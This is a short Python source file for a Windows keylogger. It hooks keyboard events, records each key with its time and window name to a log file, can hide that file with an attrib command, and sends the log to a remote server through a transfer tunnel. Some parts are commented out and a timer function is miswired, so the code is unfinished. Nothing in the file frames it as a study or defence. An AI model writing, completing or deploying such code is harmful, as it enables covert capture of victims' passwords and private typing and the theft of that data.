import pyWinhook, pythoncom, socket, os
import threading
from src import base64cipher
from src import newServer

filepath = "log.txt"


# turn file to hidden
def hide():
    file = open(filepath, "w+", encoding='utf-8')
    file.close()
    p = os.popen('attrib +h ' + filepath)
    t = p.read()
    p.close()

def opensocket():
    openTunnel = newServer.transfer(filepath)
    return openTunnel


def onKeyDown(e):
    s = f"{e.GetKey()} \t {e.Time} \t {e.WindowName} \n"
    # c.send(s.encode())
    writeToFile(s)
    return 1


def writeToFile(s):
    file = open(filepath, "a", encoding='utf-8')
    msg = encodeTXT(s)
    file.write(s)


def encodeTXT(s):
    return base64cipher.encodeMsg(s)


def start():
    # hide()
    ot = opensocket()
    # hm = pyWinhook.HookManager()
    # hm.HookKeyboard()
    # # every event from the keybord will pawer onKeyDown function
    # hm.SubscribeKeyDown(onKeyDown)
    # pythoncom.PumpMessages()
    send(ot)


def send(ot):
    # something
    ot.send_file()


def report(ot):
    send(ot)
    threading.Timer(2, report).start()


# Start tunnel
start()
